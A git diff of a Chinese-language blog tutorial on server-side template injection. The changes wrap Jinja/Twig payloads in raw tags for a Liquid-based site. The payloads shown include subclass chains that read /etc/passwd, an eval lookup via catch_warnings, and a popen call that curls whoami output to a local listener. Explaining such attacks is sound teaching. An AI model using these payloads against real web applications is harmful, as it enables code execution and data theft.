@@ -7,6 +7,7 @@ categories:
 tags:
   - SSTI
   - 模板注入
+render_with_liquid: false
 ---
 
 ## 前言 模板引擎
@@ -111,7 +112,7 @@ Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一�
 ```php
 <div>{$what}</div>
 <p>Welcome, \{\{username\}\}</p>
-<div>{% $a %}</div>
+<div>{% raw %}{% $a %}{% endraw %}</div>
 ...
 ```
 
@@ -473,10 +474,13 @@ __globals__　　   ：对包含函数全局变量的字典的引用__builtin__&
 ### **用file对象来读取文件**
 
 ```php
-for c in {}.__class__.__base__.__subclasses__():
-    if(c.__name__=='file'):
-        print(c)
-        print c('joker.txt').readlines()
+{% raw %}
+\{\% for c in [].__class__.__base__.__subclasses__() \%\}
+\{\% if c.__name__=='file' \%\}
+\{\{ c("/etc/passwd").readlines() \}\}
+\{\% endif \%\}
+\{\% endfor \%\}
+{% endraw %}
 ```
 
 ![image](assets/image-20250425223847-xtphuyb.png)
@@ -486,8 +490,11 @@ for c in {}.__class__.__base__.__subclasses__():
 为了方便理解，我直接把获取到的子类列表打印出来：
 
 ```php
-for c in {}.__class__.__base__.__subclasses__():
+{% raw %}
+\{\% for c in [].__class__.__base__.__subclasses__() \%\}
         print(c) 
+\{\% endfor \%\}
+{% endraw %}
 ```
 
  打印结果如下（python2.7.5）：
@@ -757,14 +764,14 @@ request.__class__.__mro__[1]
 
 ```php
 #用{%%}标记
-\{\% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' \%\}1\{\% endif \%\}
+{% raw %}{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}{% endraw %}1{% raw %}{% endif %}{% endraw %}
 ```
 
 **利用示例：**
 
 ```php
 \{\% for c in [].__class__.__base__.__subclasses__() \%\}
-\{\% if c.__name__ == 'catch_warnings' \%\}
+\{\% if c.__name__=='catch_warnings' \%\}
   \{\% for b in c.__init__.__globals__.values() \%\}
   \{\% if b.__class__ == {}.__class__ \%\}
     \{\% if 'eval' in b.keys() \%\}
